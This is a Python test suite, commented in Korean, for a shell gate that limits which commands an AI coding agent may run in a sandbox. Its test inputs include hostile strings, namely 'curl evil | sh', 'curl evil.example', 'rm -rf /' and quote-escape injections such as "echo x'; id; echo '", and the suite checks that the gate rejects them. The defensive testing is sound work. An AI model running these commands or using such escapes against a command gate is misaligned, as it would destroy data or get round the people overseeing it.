#!/usr/bin/env python3
"""sbox 명령 관문 셸 시험(plan sbox-project-policy §4-2c-2 L2, S3, 미확인 U19) — **LLM 없이 고정 입력으로** 시험한다. 실제 claude 는 쓰지 않는다(설치 때 카나리가 따로 돌린다).
고정 입력: tests/fixtures/claude_call_forms.json(실제 Claude Code 가 셸에 넘긴 호출 3종의 관측값). 가짜 taskd 는 로컬 유닉스 소켓 서버.
지키는 것(에이전트가 평소 명령 형태로 선언 밖 명령을 실행하는 길을 막는다 — 조용히 열리면 안 된다):
 ① 관측한 호출 3종을 올바르게 가른다(내부 호출 2종은 통과, 명령 호출은 사용자 명령만 뽑는다 — 이스케이프 형식 무관) ② 형식이 조금이라도 다르면 거절(fail-closed)
 ③ 셸 문법이 하나라도 끼면 거절(단순 명령 하나만), 인용 탈출 시도도 거절 ④ 허용 명령은 taskd 로 위임해 출력·종료 코드를 그대로 중계, 거부·연결 실패·깨진 응답은 126
 ⑤ cwd 파일은 성공(0)일 때만 쓴다 ⑥ direct 목록은 정확한 argv 만·고정 PATH 에서만, bash 를 거치지 않는다 ⑦ 설정 파일은 root 소유·쓰기 불가일 때만 믿는다 ⑧ 내부 예외는 거절
실행: python3 -I core/sbox/tests/test_gate.py  (mods/_tools/run-tests.sh 의 sbox-gate)"""
import io, json, os, shlex, shutil, socket, subprocess, sys, tempfile, threading, time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import gate  # noqa: E402

n = {"ok": 0, "bad": 0}


def check(name, cond, extra=""):
    n["ok" if cond else "bad"] += 1
    if not cond:
        print("  FAIL", name, str(extra)[:300])


fx = json.load(open(os.path.join(HERE, "fixtures", "claude_call_forms.json")))
CFG = {"direct": [["pwd"], ["ls"], ["git", "status"]]}
ENVC, SNAP, CMD = fx["captures"][0]["calls"]
PREFIX = CMD[1][:CMD[1].index("eval ")]
SNAPSHOT_PATH = "/home/sbox/.claude/shell-snapshots/snapshot-bash-1795669940272-i358iq.sh"


def hexn():
    return os.urandom(3).hex()


def form3(cmd=None, q=None, cwdfile=None, suffix=" < /dev/null && pwd -P >| ", prefix=PREFIX):
    """실제 호출 형식에 사용자 명령을 끼운 호출(Claude Code 와 같은 인용: shlex.quote 가 `'\"'\"'` 를 쓴다 — 관측 2번과 같음)."""
    cwdfile = cwdfile or f"/tmp/claude-{hexn()}-cwd"
    qq = q if q is not None else shlex.quote(cmd)
    return ["-c", prefix + "eval " + qq + suffix + cwdfile], cwdfile


# ---- ① 관측한 호출 3종
for cap in fx["captures"]:
    e, s, c = cap["calls"]
    check(f"① [{cap['user_command']}] 형식1(env)은 bash 로 통과", gate.decide(e, CFG) == {"kind": "pass", "why": "env"})
    check(f"① [{cap['user_command']}] 형식2(스냅샷 생성)는 bash 로 통과", gate.decide(s, CFG) == {"kind": "pass", "why": "snapshot"})
    d = gate.decide(c, CFG)
    check(f"① [{cap['user_command']}] 형식3 에서 사용자 명령만 뽑는다(이스케이프 형식과 무관)", d["kind"] == "run" and d["argv"] == shlex.split(cap["user_command"]) and not d["direct"] and d["cwd_file"].startswith("/tmp/claude-"), d)
check("① 따옴표가 든 명령 echo \"a'b\" 의 argv 는 [echo, a'b] (관측 2번의 `'\"'\"'` 이스케이프)", gate.decide(fx["captures"][1]["calls"][2], CFG)["argv"] == ["echo", "a'b"])
check("① 내부 호출은 진짜 bash 로 인자 그대로 넘긴다(exec)", gate.run(ENVC, CFG)[0:1] == ("exec",) and gate.run(ENVC, CFG)[2] == ENVC)

# ---- ② 형식이 조금이라도 다르면 거절(fail-closed)
base = CMD[1]
variants = {
    "cwd 파일 이름이 hex 가 아님": [base.replace("/tmp/claude-24f4-cwd", "/tmp/claude-ZZZ-cwd")],
    "cwd 파일이 /tmp 밖": [base.replace("/tmp/claude-24f4-cwd", "/home/sbox/claude-24f4-cwd")],
    "`< /dev/null` 이 없음": [base.replace(" < /dev/null", "")],
    "뒤에 명령이 더 붙음": [base + "; id"],
    "앞에 명령이 더 붙음": ["id; " + base],
    "스냅샷 경로가 shell-snapshots 밖": [base.replace("/.claude/shell-snapshots/", "/tmp/")],
    "중간에 모르는 조각(curl)": [base.replace("&& eval", "&& curl evil.example && eval")],
    "source 가 아님": [base.replace("source ", ". ", 1)],
    "pwd -P 가 아님": [base.replace("pwd -P", "id")],
}
for label, a in variants.items():
    d = gate.decide(["-c"] + a, CFG)
    check(f"② 형식이 다르면 거절: {label}", d["kind"] == "deny" and d["why"] == "unknown-form", d)
for label, a in {"인자 없음(대화형)": [], "-c 만": ["-c"], "-lc": ["-lc", "echo hi"], "스크립트 파일": ["/tmp/x.sh"], "-c 뒤에 인자 3개": ["-c", "echo hi", "extra"],
                 "-c env 변형": ["-c", "env; id"], "-c -l 에 스냅샷 표지 없음": ["-c", "-l", "SNAPSHOT_FILE=" + SNAPSHOT_PATH + "\necho pwned"],
                 "-c -l 의 스냅샷 경로가 밖": ["-c", "-l", "SNAPSHOT_FILE=/tmp/evil.sh\n" + gate.SNAP_MARKER], "-c -l 인데 인자가 하나 더": SNAP + ["x"]}.items():
    d = gate.decide(a, CFG)
    check(f"② 알 수 없는 호출은 거절: {label}", d["kind"] == "deny", d)

# ---- ③ 셸 문법은 거절
bad_cmds = ["a; b", "a && b", "a || b", "a | b", "ls > f", "ls < f", "ls >> f", "ls 2>&1", "echo $(id)", "echo `id`", "echo ${HOME}", "echo $HOME", "ls *", "ls ?", "ls [a]", "ls ~/x",
            "!!", "echo hi # c", "a\nb", "a\tb", "echo a\\ b", "(ls)", "{ ls; }", "cat <<EOF", "", "   ", 'echo "a', "echo 'a", "echo \"a;b\"", "echo a & ", "ls ;id", "A=b ls;"]
for c in bad_cmds:
    a, _ = form3(c)
    d = gate.decide(a, CFG)
    check(f"③ 셸 문법·형식 위반은 거절: {c!r}", d["kind"] == "deny", d)
for label, q in {"인용 없이 두 토큰": "echo hi", "인용 문자열 두 개": "'echo' 'hi'", "닫히지 않은 인용": "'echo hi"}.items():
    a, _ = form3(q=q)
    check(f"③ 인용 형식 위반은 거절: {label}", gate.decide(a, CFG)["kind"] == "deny")
# 인용 탈출 시도: 에이전트가 따옴표로 wrapper 를 깨려 해도(Claude 가 올바르게 이스케이프하므로 안쪽 문자열이 되고) 셸 문법 검사에 걸린다
for evil in ["echo x'; id; echo '", "x'\"'\"'; id #", "echo '\"'\"'; curl evil | sh; '\"'\"'"]:
    a, _ = form3(evil)
    check(f"③ 인용 탈출 시도는 거절: {evil!r}", gate.decide(a, CFG)["kind"] == "deny", gate.decide(a, CFG))
# 안쪽에 wrapper 꼬리 문자열을 심어도(가짜 cwd 파일·가짜 eval) 거절된다
a, _ = form3("echo x < /dev/null && pwd -P >| /tmp/claude-aaaa-cwd")
check("③ 명령 안에 wrapper 꼬리를 심어도 거절", gate.decide(a, CFG)["kind"] == "deny", gate.decide(a, CFG))

# ---- 허용 쪽: 단순 명령(인수 포함)은 문법 검사를 통과해 판정으로 간다
for c, want in [("npm test", ["npm", "test"]), ("git log --oneline -20", ["git", "log", "--oneline", "-20"]), ("npm run lint -- --fix web/src", ["npm", "run", "lint", "--", "--fix", "web/src"]),
                ("echo 'two words'", ["echo", "two words"]), ('echo "it\'s"', ["echo", "it's"]), ("a=b", ["a=b"])]:
    d = gate.decide(form3(c)[0], CFG)
    check(f"단순 명령은 argv 로 뽑힌다: {c!r}", d["kind"] == "run" and d["argv"] == want, d)

# ---- ④ 위임: 가짜 taskd
tmp = tempfile.mkdtemp()
SOCK = os.path.join(tmp, "taskd.sock")
script = {"replies": [], "req": []}


def fake_taskd():
    srv = socket.socket(socket.AF_UNIX); srv.bind(SOCK); srv.listen(8)
    while True:
        c, _ = srv.accept()
        buf = b""
        while b"\n" not in buf:
            ch = c.recv(4096)
            if not ch:
                break
            buf += ch
        script["req"].append(json.loads(buf.split(b"\n")[0]))
        for r in script["replies"]:
            c.sendall((r if isinstance(r, bytes) else (json.dumps(r) + "\n").encode()))
            time.sleep(0.01)
        c.close()


threading.Thread(target=fake_taskd, daemon=True).start()
for _ in range(50):
    if os.path.exists(SOCK):
        break
    time.sleep(0.05)


def go(cmd, replies, cfg=CFG, sock=SOCK):
    script["replies"], script["req"] = replies, []
    a, cwdfile = form3(cmd)
    out, err = io.StringIO(), io.StringIO()
    rc = gate.run(a, cfg, sock, out, err)
    wrote = os.path.exists(cwdfile)
    if wrote:
        txt = open(cwdfile).read(); os.unlink(cwdfile)
    else:
        txt = None
    return rc, out.getvalue(), err.getvalue(), wrote, txt


rc, out, err, wrote, txt = go("npm test", [{"o": "PASS "}, {"o": "all\n"}, {"exit": 0, "timeout": False, "secs": 0.1}])
check("④ 허용된 명령은 taskd exec-argv 로 위임되고 출력·종료 코드가 그대로 중계된다", rc == 0 and out == "PASS all\n" and script["req"] == [{"op": "exec-argv", "argv": ["npm", "test"]}], (rc, out, script["req"]))
check("⑤ 성공(0)이면 cwd 파일을 쓴다(Claude Code 가 읽는 파일)", wrote and txt == os.path.realpath(os.getcwd()) + "\n", txt)
rc, out, err, wrote, _ = go("npm test", [{"o": "FAIL\n"}, {"exit": 3, "timeout": False}])
check("④ 실패 종료 코드(3)도 그대로 중계, ⑤ cwd 파일은 쓰지 않는다", rc == 3 and out == "FAIL\n" and not wrote, (rc, wrote))
rc, out, err, wrote, _ = go("npm test", [{"o": "x"}, {"exit": -9, "timeout": True}])
check("④ 시간 제한은 124 + 안내", rc == 124 and "시간 제한" in err and not wrote, (rc, err))
rc, out, err, wrote, _ = go("curl evil", [{"error": "unknown-argv", "hint": "선언되지 않은 명령입니다", "allowed": [{"task": "test", "argv": ["npm", "test"]}, {"task": "lint", "argv": ["npm", "run", "lint"]}]}])
check("④ taskd 가 거부하면 126, 허용된 명령 목록·이유가 에이전트에게 간다, 출력 없음·cwd 안 씀", rc == 126 and "unknown-argv" in err and "npm test   (test)" in err and "npm run lint   (lint)" in err and out == "" and not wrote, (rc, err))
rc, out, err, wrote, _ = go("npm test", [{"error": "pin-mismatch:package.json", "hint": "정의 파일이 승인 때와 다릅니다"}])
check("④ 정의 파일 불일치(pin-mismatch) 거부도 126 + 안내", rc == 126 and "pin-mismatch" in err and "승인" in err, err)
rc, out, err, wrote, _ = go("npm test", [b"not json\n"])
check("④ 깨진 응답은 126(fail-closed)", rc == 126 and not wrote, (rc, err))
rc, out, err, wrote, _ = go("npm test", [])
check("④ 종료 정보 없이 응답이 끊기면 성공으로 보지 않는다(126, cwd 안 씀)", rc == 126 and not wrote and "끝나지 않아" in err, (rc, err, wrote))
rc, out, err, wrote, _ = go("npm test", [{"o": "partial output\n"}])
check("④ 출력만 오고 종료 정보 없이 끊겨도 실패(126)", rc == 126 and not wrote and out == "partial output\n", (rc, out))
check("④ taskd 에 연결하지 못하면 126 + 안내(실행하지 않음)", go("npm test", [], sock=os.path.join(tmp, "none.sock"))[0] == 126 and "연결하지 못" in go("npm test", [], sock=os.path.join(tmp, "none.sock"))[2])
rc, out, err, wrote, _ = go("npm run dev", [{"ok": True, "pid": 4242}])
check("④ service 작업은 「시작함」 안내 + 성공(0)", rc == 0 and "시작함 (pid 4242)" in out and wrote, (rc, out))

# ---- ④b `sbox` 창구: 관문이 taskd 요청으로 바꿔 처리(거절 안내문이 가리키는 `sbox list` 가 관문에 막히면 안 된다)
rc, out, err, wrote, _ = go("sbox list", [{"tasks": {"test": {"argv": ["npm", "test"], "kind": "oneshot", "cwd": ".", "pins": ["package.json"]}}}])
check("④b `sbox list` 는 list 요청으로 바뀌어 작업 목록이 출력된다(관문에 막히지 않는다)", rc == 0 and script["req"] == [{"op": "list"}] and "test" in out and "npm test" in out and "package.json" in out and wrote, (rc, out, script["req"]))
rc, out, err, wrote, _ = go("sbox run test", [{"o": "ran\n"}, {"exit": 0, "timeout": False}])
check("④b `sbox run NAME` 은 run 요청으로 바뀌어 실행·중계된다", rc == 0 and script["req"] == [{"op": "run", "task": "test"}] and out == "ran\n", (rc, out, script["req"]))
rc, out, err, wrote, _ = go("sbox status svc", [{"running": True, "kind": "service"}])
check("④b `sbox status NAME`", rc == 0 and out == "실행 중\n" and script["req"] == [{"op": "status", "task": "svc"}], (rc, out))
rc, out, err, wrote, _ = go("sbox logs svc", [{"o": "log line\n"}])
check("④b `sbox logs NAME` 은 출력만 와도 정상(종료 정보 요구는 실행 요청에만)", rc == 0 and out == "log line\n", (rc, out, err))
rc, out, err, wrote, _ = go("sbox stop svc", [{"ok": True, "running": False}])
check("④b `sbox stop NAME`", rc == 0 and script["req"] == [{"op": "stop", "task": "svc"}] and "실행 중 아님" in out, (rc, out))
for bad in ["sbox", "sbox run", "sbox run a b", "sbox run Test", "sbox run ../x", "sbox exec x", "sbox list extra", "sbox run test --rm"]:
    d = gate.decide(form3(bad)[0], CFG)
    check(f"④b sbox 사용법 위반은 거절: {bad!r}", d["kind"] == "deny", d)
rc, out, err, wrote, _ = go("sbox run test", [{"o": "x"}])
check("④b run 요청이 종료 정보 없이 끊기면 실패(126)", rc == 126 and not wrote, rc)
rc, out, err, wrote, _ = go("sbox list", [])
check("④b 조회도 응답이 전혀 없으면 실패(126)", rc == 126, rc)

# ---- ⑥ direct: 정확한 argv 만, bash 없이, 고정 PATH
real_echo = shutil.which("echo")
gate.FIXED_PATH = (os.path.dirname(real_echo),)
cfg2 = {"direct": [["echo", "direct-ok"], ["/bin/echo", "x"]]}
script["req"] = []
rc, out, err, wrote, _ = go("echo direct-ok", [], cfg=cfg2, sock=os.path.join(tmp, "none.sock"))
check("⑥ direct 목록의 명령은 taskd 없이 직접 실행되고 성공이면 cwd 를 쓴다", rc == 0 and out == "direct-ok\n" and wrote and script["req"] == [], (rc, out, err))
rc, out, err, wrote, _ = go("echo other", [], cfg=cfg2, sock=os.path.join(tmp, "none.sock"))
check("⑥ direct 와 한 토큰이라도 다르면 위임 경로로 간다(여기선 taskd 없음 → 126)", rc == 126 and out == "", (rc, out, err))
rc, out, err, wrote, _ = go("echo direct-ok extra", [], cfg=cfg2, sock=os.path.join(tmp, "none.sock"))
check("⑥ direct 의 접두 일치는 안 된다(토큰 추가)", rc == 126 and out == "")
rc, out, err, wrote, _ = go("/bin/echo x", [], cfg=cfg2, sock=os.path.join(tmp, "none.sock"))
check("⑥ direct 가 경로가 든 실행 파일이면 거절(PATH 검색 우회 방지)", rc == 126 and out == "", (rc, err))
rc, out, err, wrote, _ = go("no-such-cmd-xyz", [], cfg={"direct": [["no-such-cmd-xyz"]]}, sock=os.path.join(tmp, "none.sock"))
check("⑥ direct 의 실행 파일을 고정 경로에서 못 찾으면 거절", rc == 126 and "찾지 못" in err, (rc, err))
d = gate.decide(form3("echo direct-ok")[0], cfg2)
check("⑥ decide 는 direct 여부만 표시한다", d["kind"] == "run" and d["direct"] is True)

# ---- ⑦ 설정 파일 신뢰
cp = os.path.join(tmp, "gate.json")
json.dump({"direct": [["ls", "-la"]]}, open(cp, "w"))
check("⑦ root 소유가 아니면(시험은 일반 사용자) 설정을 무시하고 기본값", gate.load_config(cp) == {"direct": [list(x) for x in gate.DEFAULT_DIRECT]})
check("⑦ require_root=False 면 설정을 읽는다(시험용)", gate.load_config(cp, require_root=False) == {"direct": [["ls", "-la"]]})
os.chmod(cp, 0o666)
check("⑦ 그룹·기타가 쓸 수 있으면 읽지 않는다", gate.load_config(cp, require_root=True) == {"direct": [list(x) for x in gate.DEFAULT_DIRECT]})
os.chmod(cp, 0o644)
for label, body in {"깨진 JSON": "{bad", "direct 가 목록이 아님": '{"direct": "ls"}', "항목이 문자열": '{"direct": ["ls"]}', "빈 argv": '{"direct": [[]]}', "숫자 토큰": '{"direct": [["ls", 1]]}'}.items():
    open(cp, "w").write(body)
    check(f"⑦ 설정이 잘못되면 기본값: {label}", gate.load_config(cp, require_root=False) == {"direct": [list(x) for x in gate.DEFAULT_DIRECT]})
check("⑦ 설정 파일이 없으면 기본값", gate.load_config(os.path.join(tmp, "nope.json")) == {"direct": [list(x) for x in gate.DEFAULT_DIRECT]})

# ---- ⑧ 내부 예외는 거절 / 프로그램으로 실행
orig_run = gate.run
gate.run = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom"))
save_err, sys.stderr = sys.stderr, io.StringIO()
rc = gate.main(["-c", "env"])
msg = sys.stderr.getvalue(); sys.stderr = save_err
gate.run = orig_run
check("⑧ 판정 중 예외는 126(fail-closed)", rc == 126 and "내부 오류" in msg, (rc, msg))
gp = os.path.join(os.path.dirname(HERE), "gate.py")
r = subprocess.run([sys.executable, "-I", gp, "-c", "env"], capture_output=True, text=True)
check("프로그램: -c env 는 진짜 bash 로 넘어가 환경이 출력된다(exec)", r.returncode == 0 and "PATH=" in r.stdout, r.stderr)
a, cwdf = form3("rm -rf /")
r = subprocess.run([sys.executable, "-I", gp] + a, capture_output=True, text=True)
check("프로그램: 선언 밖 명령은 126, 실행되지 않고 cwd 도 안 쓴다(taskd 소켓 없음)", r.returncode == 126 and not os.path.exists(cwdf) and "sbox-gate" in r.stderr, (r.returncode, r.stderr))
a, cwdf = form3("a; b")
r = subprocess.run([sys.executable, "-I", gp] + a, capture_output=True, text=True)
check("프로그램: 셸 문법은 126 + 안내", r.returncode == 126 and "셸 문법" in r.stderr and "sbox list" in r.stderr, r.stderr)
r = subprocess.run([sys.executable, "-I", gp, "-c", "-l", "SNAPSHOT_FILE=/tmp/x.sh\n" + gate.SNAP_MARKER], capture_output=True, text=True)
check("프로그램: 형식이 틀린 스냅샷 호출은 126", r.returncode == 126, r.stderr)
env = dict(os.environ, SBOX_TASKD_SOCKET="/nonexistent", PATH="/nonexistent", SHELL="/bin/sh")
a, cwdf = form3("npm test")
r = subprocess.run([sys.executable, "-I", gp] + a, capture_output=True, text=True, env=env)
check("프로그램: 환경변수로 소켓 경로·PATH 를 바꿔도 동작이 바뀌지 않는다(상수 경로 — 연결 실패로 126)", r.returncode == 126 and "/run/sbox-taskd/sock" in r.stderr, r.stderr)

# ---- 설치 보조(gate_setup): 관리 설정 병합·제거 — 지키는 것: sboxctl llm 이 관리 설정을 다시 밀어 넣어도 관문 고정이 사라지지 않고, 다른 설정은 건드리지 않는다
import gate_setup  # noqa: E402
base = json.dumps({"permissions": {"ask": ["Bash(npm install)"]}, "env": {"DISABLE_AUTOUPDATER": "1"}})
m = json.loads(gate_setup.merge(base))
check("설치: env.CLAUDE_CODE_SHELL 이 관문 경로로 들어가고 다른 env·permissions 는 그대로", m["env"] == {"DISABLE_AUTOUPDATER": "1", "CLAUDE_CODE_SHELL": gate_setup.GATE_PATH} and m["permissions"] == {"ask": ["Bash(npm install)"]}, m)
check("설치: 셸 경로에 bash 가 들어 있다(U6)", "bash" in os.path.basename(m["env"]["CLAUDE_CODE_SHELL"]))
check("설치는 멱등(두 번 해도 같다)", gate_setup.merge(gate_setup.merge(base)) == gate_setup.merge(base))
check("env 가 없는 설정에도 병합된다", json.loads(gate_setup.merge('{"a": 1}'))["env"] == {"CLAUDE_CODE_SHELL": gate_setup.GATE_PATH})
check("env 가 객체가 아니면 새로 만든다(깨진 설정이 관문 고정을 막지 않는다)", json.loads(gate_setup.merge('{"env": "x"}'))["env"] == {"CLAUDE_CODE_SHELL": gate_setup.GATE_PATH})
u = json.loads(gate_setup.unmerge(gate_setup.merge(base)))
check("제거: 관문 키만 지우고 나머지는 원래대로", u == json.loads(base), u)
check("제거: env 가 비면 env 키도 지운다", "env" not in json.loads(gate_setup.unmerge(gate_setup.merge('{"a": 1}'))))
check("제거: 관문이 없던 설정은 그대로", json.loads(gate_setup.unmerge(base)) == json.loads(base))
real_ms = json.load(open(os.path.join(os.path.dirname(HERE), "claude-managed-settings.json")))
check("저장소의 관리 설정(⑱·MCP 차단)에 병합해도 permissions 가 그대로", json.loads(gate_setup.merge(open(os.path.join(os.path.dirname(HERE), "claude-managed-settings.json")).read()))["permissions"] == real_ms["permissions"])
check("카나리 보조: 호출 형식 조립이 고정물과 같은 구조", __import__("gate_canary").form3("/tmp/claude-abcd-cwd", "echo hi")[1].startswith("source ") and __import__("gate_canary").form3("/tmp/claude-abcd-cwd", "echo hi")[1].endswith("eval 'echo hi' < /dev/null && pwd -P >| /tmp/claude-abcd-cwd"))
d_ = gate.decide(__import__("gate_canary").form3("/tmp/claude-abcd-cwd", "sbox-canary-undeclared"), CFG)
check("카나리가 보내는 선언 밖 명령 호출을 관문이 명령 호출로 인식한다", d_["kind"] == "run" and d_["argv"] == ["sbox-canary-undeclared"], d_)

print(f"sbox-gate {n['ok']} 통과 / {n['bad']} 실패")
sys.exit(1 if n["bad"] else 0)
